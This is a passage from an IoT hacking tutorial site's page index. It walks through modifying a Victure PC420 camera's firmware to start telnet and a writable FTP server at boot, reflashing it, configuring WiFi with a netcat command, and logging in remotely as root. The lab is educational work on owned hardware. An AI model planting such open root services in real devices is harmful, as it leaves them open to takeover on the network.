ftp upon boot. Edit rootfs/etc/init.d/rcS and uncomment lines 7 and 8\necho \u0026quot;start telnet......\u0026quot; telnetd \u0026amp; Edit rootfs/etc/init.d/rc.local and uncomment line 13\n/bin/tcpsvd 0 21 ftpd -w / -t 600 \u0026amp; Build firmware Now that we have modified the initialization scripts, we are going to \u0026lsquo;resquash\u0026rsquo; the files\nkali@kali:~$ mksquashfs rootfs /mnt/pc420/root.sqsh4 -comp xz Where,\n rootfs: The path to the directory containing the filesystem /mnt/pc420/root.sqsh4: The destination of the resulting squashfs file -comp xz: Compress the filesystem using xz  Once complete, unmount the micro SD card\nkali@kali:~$ sudo umount /mnt/pc420 Update camera firmware Now that we have the modified squashfs file, we can update the camera\u0026rsquo;s firmware. Plug the micro SD into the camera and run the following\n~ # mount /dev/mmcblk0p1 /mnt ~ # /usr/sbin/update.sh Where,\n mount /dev/mmcblk0p1 /mnt: Mounts the micro SD card to /mnt /usr/sbin/update.sh: Runs the script to update the camera\u0026rsquo;s firmware  The camera should reboot once it is done updating.\nConnect camera to WiFi Now that the firmware has been updated, we no longer need to boot to /bin/sh. To change the bootargs, follow the steps taken in the UART to U-Boot section to get into the U-Boot shell and run the following:\nanyka$ setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/init mem=64M memsize=64M anyka$ saveenv Saving Environment to SPI Flash... Env save done OK Now disconnect and re connect the power to the camera. The camera should not boot into a shell but should run our modified initialization scripts.\nWe now need to connect the camera to the WiFi. The first step to do this is to connect the computer to the WiFi the camera is broadcasting. The camera\u0026rsquo;s WiFi SSID should start with \u0026lsquo;Victure_\u0026rsquo;.\nOnce connected, run the following on the computer, replacing PASSWORD and SSID with the password and SSID of the WiFi it should connect to:\nqrcode_header='\\x68\\x00\\x00\\x00\\x80' victure_user=\u0026quot;95c992cdf31fc7d0\u0026quot; timezone=\u0026quot;-7.00\u0026quot; region=\u0026quot;US\u0026quot; wifi_type=\u0026quot;WPA\u0026quot; wifi_password='PASSWORD' wifi_ssid='SSID' payload=\u0026quot;WIFI:U:$victure_user;Z:$timezone;R:$region;T:$wifi_type;P:\\\u0026quot;$wifi_password\\\u0026quot;;S:$wifi_ssid;\u0026quot; ssidLength=\u0026quot;${#wifi_ssid}\u0026quot; passwordLength=\u0026quot;${#wifi_password}\u0026quot; payloadLength=\u0026quot;${#payload}\u0026quot; lengths=\u0026quot;$passwordLength;$ssidLength;$payloadLength\u0026quot; echo -en \u0026quot;${qrcode_header}L:$lengths;$payload\u0026quot; | nc -v 10.1.8.1 6666 This sends the camera all of the info it needs in order to connect to the WiFi. Once done, you should see output in the screen session related to the camera connecting to the WiFi. Make note of the IP that is displayed once it has connected to the WiFi.\nSending select for 192.168.4.46... Lease of 192.168.4.46 obtained, lease time 14400 deleting routes route: SIOCDELRT: No such process adding dns 69.27.0.130 adding dns 69.27.0.131 totalsize [4857755] VmRSS [3672] [4020] VmSize [13104] no network for token interface [wlan0] ip [192.168.4.46] "},{"uri":"https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/","title":"Test Remote Connection","tags":[],"description":"","content":"Test Remote Connection Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.\nkali@kali:~$ telnet 192.168.4.46 Trying 192.168.4.46... Connected to 192.168.4.46. Escape character is '^]'. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux "},{"uri":"https://iot-hack-labs.github.io/","title":"","tags":[],"description":"","content":"IoT Hack Labs Use the left hand navigation to select a tutorial.\n"},{"uri":"https://iot-hack-labs.github.io/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://iot-hack-labs.github.io/tags/","title":"Tags","tags":[],"description":"","content":""}]